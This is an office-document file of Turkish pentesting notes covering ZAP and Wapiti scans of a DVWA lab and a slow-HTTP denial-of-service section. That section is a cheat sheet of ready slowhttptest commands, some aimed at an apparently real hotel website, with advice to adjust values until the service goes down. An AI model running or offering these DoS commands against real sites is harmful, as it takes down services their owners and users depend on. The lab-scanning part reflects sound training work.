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d27fe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27c5d8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c9211e" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="14pt" fo:font-weight="bold" officeooo:rsid="002c33e7" officeooo:paragraph-rsid="002c33e7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color="#c9211e" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="14pt" fo:font-weight="bold" officeooo:rsid="002c33e7" officeooo:paragraph-rsid="002e7495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color="#c9211e" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="14pt" fo:font-weight="bold" officeooo:rsid="002c33e7" officeooo:paragraph-rsid="00307429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color="#c9211e" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="14pt" fo:font-weight="bold" officeooo:rsid="0033be15" officeooo:paragraph-rsid="0033be15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2e7495" officeooo:paragraph-rsid="002e7495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1c490a" officeooo:paragraph-rsid="0027c5d8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1c490a" officeooo:paragraph-rsid="001d27fe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2f4fb9" officeooo:paragraph-rsid="002f4fb9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normal" officeooo:rsid="00307429" officeooo:paragraph-rsid="00307429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.5pt" fo:font-weight="normal" officeooo:rsid="00325c53" officeooo:paragraph-rsid="00325c53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fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10.5pt" fo:font-weight="normal" officeooo:rsid="0033be15" officeooo:paragraph-rsid="0033be15" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="10.5pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T1" style:family="text">
      <style:text-properties officeooo:rsid="002e7495"/>
    </style:style>
    <style:style style:name="T2" style:family="text">
      <style:text-properties officeooo:rsid="00307429"/>
    </style:style>
    <style:style style:name="T3" style:family="text">
      <style:text-properties officeooo:rsid="0033be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AP (Zed Attack Proxy) ile Tarama ve Rapor</text:p>
      <text:p text:style-name="P7">Analyse &gt; Scan Policy Manager</text:p>
      <text:p text:style-name="P7">Report &gt; Generate Report</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P4"><text:span text:style-name="T1">Wapiti </text:span>ile Tarama ve Rapor</text:p>
      <text:p text:style-name="P7">module <text:s text:c="2"/>shellshock <text:s/>(OS Command INjection)</text:p>
      <text:p text:style-name="P2">--<text:span text:style-name="T1">tor <text:s/>(tora gir.)</text:span></text:p>
      <text:p text:style-name="P10">ctrl+C , pause eder.</text:p>
      <text:p text:style-name="P10">--flush-session, --flush-attack <text:s/>tarama ve attack ları 0lar.</text:p>
      <text:p text:style-name="P10"/>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P5"><text:span text:style-name="T1">Wapiti </text:span><text:span text:style-name="T2">ile Cookie kullanma (login form için)</text:span></text:p>
      <text:p text:style-name="P11">dvwa login form..</text:p>
      <text:p text:style-name="P11">POST metodunu yakalamak için burpsuite açalım.</text:p>
      <text:p text:style-name="P11">wapiti-getcookie -u http://10.10.10.22/dvwa/login.php -c ~/Desktop/dvwa-cookie.json -d "username=admin&amp;password=admin&amp;Login=Login"</text:p>
      <text:p text:style-name="P12">cookie miz hazır.</text:p>
      <text:p text:style-name="P12">Sorgu yapacağımız url, güvenlik açıklarının bulunduğu url dizini olmalı.</text:p>
      <text:p text:style-name="P12"><text:a xlink:type="simple" xlink:href="http://10.10.10.22/dvwa/vulnerabilities" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">http://10.10.10.22/dvwa/vulnerabilities</text:a></text:p>
      <text:p text:style-name="P12">wapiti -u http://10.10.10.22/dvwa/vulnerabilities -c /root/Desktop/dvwa-cookie.json --auth-type post -s http://10.10.10.22/dvwa/login.php --auth-cred admin%123 -v 1 --scan-force normal --color -o ~/Desktop/dvwa-report.json -f json</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P6">WEB Pentest Raporu Yorumlama (Request-Response, Parameter, Encode, Payload...)</text:p>
      <text:p text:style-name="P13">Bulduğumuz açık URL lerde, inpect, source code dan inceleyelim.</text:p>
      <text:p text:style-name="P13"/>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P6">DOS (Denial of Service) - SlowHTTP Saldırısı</text:p>
      <text:p text:style-name="P1">slowhttptest -c 1000 -r 200 -H -i 5 -t POST -x 50 -t 3600 -<text:span text:style-name="T3">o</text:span> ~/Desktop/slow-test -g -u https://filoxeniachios.gr/en/home/</text:p>
      <text:p text:style-name="P1">slowhttptest -c 1000 -r 200 -X -w 512 -y 1024 -n 5 -k 3 -u <text:a xlink:type="simple" xlink:href="https://filoxeniachios.gr/en/home/" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">https://filoxeniachios.gr/en/home/</text:a></text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P13">cheat sheet</text:p>
      <text:p text:style-name="P13">slowhttptest -c 1000 -H -r 200 -c 400 -i 10 -t POST -l 3600 -o ~/Desktop/slow-test1 -g -u https://pentesturl.xyz</text:p>
      <text:p text:style-name="P13">slowhttptest -c 3000 -X -r 200 -w 4096 -y 8192 -i 10 -t POST -n 3 -z 32 -x 24 -k 2 -p 2 -l 3600 -o ~/Desktop/slow-test2 -g -u https://pentesturl.xyz</text:p>
      <text:p text:style-name="P13">slowhttptest -c 1000 -X -r 200 -w 512 -y 1024 -n 5 -z 32 -k 3 o- ~/Desktop/slow-test3 -g -u https://pentesturl.xyz</text:p>
      <text:p text:style-name="P13">slowhttptest -c 1000 -X -r 200 -w 20 -y 40 -n 5 -z 32 -k 3 o- ~/Desktop/slow-test4 -g -u https://pentesturl.xyz</text:p>
      <text:p text:style-name="P13">slowhttptest -c 2000 -X -r 200 -w 2048 -y 4096 -n 3 -z 32 -k 2 -p 3 -l 3600 -o ~/Desktop/slow-test5 -g -u https://pentesturl.xyz</text:p>
      <text:p text:style-name="P13">slowhttptest -c 3000 -B -r 300 -i 100 <text:s/>-s 8192 -t fakeverb -p 3 -x 20 -o ~/Desktop/slow-test6 -g -u https://pentesturl.xyz</text:p>
      <text:p text:style-name="P13"/>
      <text:p text:style-name="P13">Kontrol sitesi: https://www.isitdownrightnow.com/</text:p>
      <text:p text:style-name="P13"/>
      <text:p text:style-name="P13">Not: Sonuç alamadığınız durumlarda değerleri değiştirerek deneyebilirsiniz. Güvenlik açığı mevcutsa hizmet dışı kalacaktır. Test etmeden önce bildiriniz.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1T13:37:06.381564819</dc:date>
    <meta:editing-duration>PT4H59M26S</meta:editing-duration>
    <meta:editing-cycles>19</meta:editing-cycles>
    <meta:generator>LibreOffice/7.4.1.2$Linux_X86_64 LibreOffice_project/3c58a8f3a960df8bc8fd77b461821e42c061c5f0</meta:generator>
    <meta:document-statistic meta:table-count="0" meta:image-count="0" meta:object-count="0" meta:page-count="2" meta:paragraph-count="30" meta:word-count="323" meta:character-count="2204" meta:non-whitespace-character-count="1912"/>
  </office:meta>
</office:document-meta>
</file>